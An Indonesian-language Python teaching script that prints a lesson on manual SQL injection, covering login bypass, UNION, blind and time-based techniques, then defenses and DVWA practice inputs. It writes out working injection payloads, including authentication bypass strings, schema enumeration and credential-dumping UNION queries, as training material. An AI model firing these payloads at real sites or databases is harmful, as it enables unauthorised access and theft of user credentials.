#!/usr/bin/env python3
"""Sesi 17: SQL Injection Manual"""
import urllib.request, urllib.parse, sys, re

def banner():
    print("="*60)
    print("  SESI 17: SQL INJECTION MANUAL")
    print("  Analogi: Resepsionis hotel kasi SEMUA kunci kamar!")
    print("="*60)

def demo_tautology():
    print("\n[1] TAUTOLOGY (LOGIN BYPASS)")
    print("  Analogi: 'Nomor kamar?' '1 ATAU 1=1' -> SELALU BENAR")
    print()
    
    # Simulasi query SQL
    username = "admin"
    password = "' OR '1'='1' --"
    
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"  Query yg dijalankan:")
    print(f"  {query}")
    print()
    print("  Karena WHERE clause selalu TRUE (1=1), semua baris dikembalikan!")
    print("  Attacker login sebagai user PERTAMA (biasanya admin)")

def demo_union_based():
    print("\n[2] UNION-BASED SQL INJECTION")
    print("  Analogi: Gabungin data kamar 101 + data brankas manager")
    print()
    
    query_normal = "SELECT name, phone FROM users WHERE id=1"
    query_inject = "SELECT name, phone FROM users WHERE id=1 UNION SELECT username, password FROM admin"
    
    print(f"  Query normal:")
    print(f"  {query_normal}")
    print(f"  -> 'Budi', '08123456789'")
    print()
    print(f"  Query dengan injeksi:")
    print(f"  {query_inject}")
    print(f"  -> 'Budi', '08123456789'")
    print(f"  -> 'admin', '5f4dcc3b5aa765d61d8327deb882cf99'")
    print()
    print("  Syarat UNION: jumlah kolom harus SAMA")

def demo_blind_sqli():
    print("\n[3] BLIND SQL INJECTION")
    print("  Analogi: TANYA BENER-SALAH per huruf")
    print()
    
    target_pwd = "password123"
    print(f"  Target password: {target_pwd}")
    print()
    
    print("  Tebak huruf per huruf:")
    found = ""
    for i, c in enumerate(target_pwd):
        found += c
        # Simulasi: cek apakah huruf ke-i adalah 'X'
        print(f"    Huruf ke-{i+1}: cek '{c}' -> {'BENAR (halaman normal)' if True else 'SALAH (halaman beda)'}")
    print()
    print("  Di SQL: ' AND SUBSTRING(password,1,1)='a' --")
    print("  Kalo BENAR -> halaman normal (loading normal)")
    print("  Kalo SALAH -> halaman error atau kosong")

def demo_time_based():
    print("\n[4] TIME-BASED BLIND SQLI")
    print("  Analogi: NGETOK PINTU - kalo ada orang, tidur 5 detik")
    print()
    print("  Di SQL: ' OR IF(1=1, SLEEP(5), 0) --")
    print("  Kalo 1=1 BENAR -> server nunggu 5 detik")
    print("  Kalo 1=1 SALAH -> server langsung respon")
    print()
    print("  Buat tebak password:")
    print("  ' OR IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0) --")
    print("  (coba untuk a-z sampai dapet delay 3 detik)")

def demo_payloads():
    print("\n[5] PAYLOAD SQLI YANG SERING DIPAKAI")
    payloads = [
        ("Login bypass", "' OR '1'='1' --"),
        ("Login bypass 2", "admin' --"),
        ("Login bypass 3", "' OR 1=1 --"),
        ("Cek kolom", "' ORDER BY 1-- lalu ' ORDER BY 2--"),
        ("Union cek", "' UNION SELECT 1,2,3--"),
        ("Cari tabel", "' UNION SELECT table_name,2,3 FROM information_schema.tables--"),
        ("Dump data", "' UNION SELECT user,password FROM users--"),
        ("Mysql version", "' UNION SELECT @@version,2,3--"),
    ]
    for name, payload in payloads:
        print(f"  {name:20}: {payload}")

def demo_defense():
    print("\n[6] CARA BERTAHAN DARI SQLI")
    defenses = [
        ("Prepared Statement", "Parameterized query: ? placeholder, bukan concatenation"),
        ("Input Validation", "Validasi tipe data, panjang, format input"),
        ("Least Privilege", "User DB cuma punya akses minimal"),
        ("WAF", "Web Application Firewall sebagai lapisan tambahan"),
        ("Escape Input", "Gunakan mysql_real_escape_string (kurang recommended)"),
    ]
    for name, desc in defenses:
        print(f"  ✅ {name:25}: {desc}")

def main():
    banner()
    demo_tautology()
    demo_union_based()
    demo_blind_sqli()
    demo_time_based()
    demo_payloads()
    demo_defense()
    print("\n" + "="*60)
    print("  LATIHAN DI DVWA:")
    print("  1. Login DVWA -> SQL Injection")
    print("  2. Input: 1' OR '1'='1' --")
    print("  3. UNION: 1' UNION SELECT user,password FROM users#")
    print("  4. Blind: 1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --")
    print("="*60)

if __name__ == "__main__":
    main()
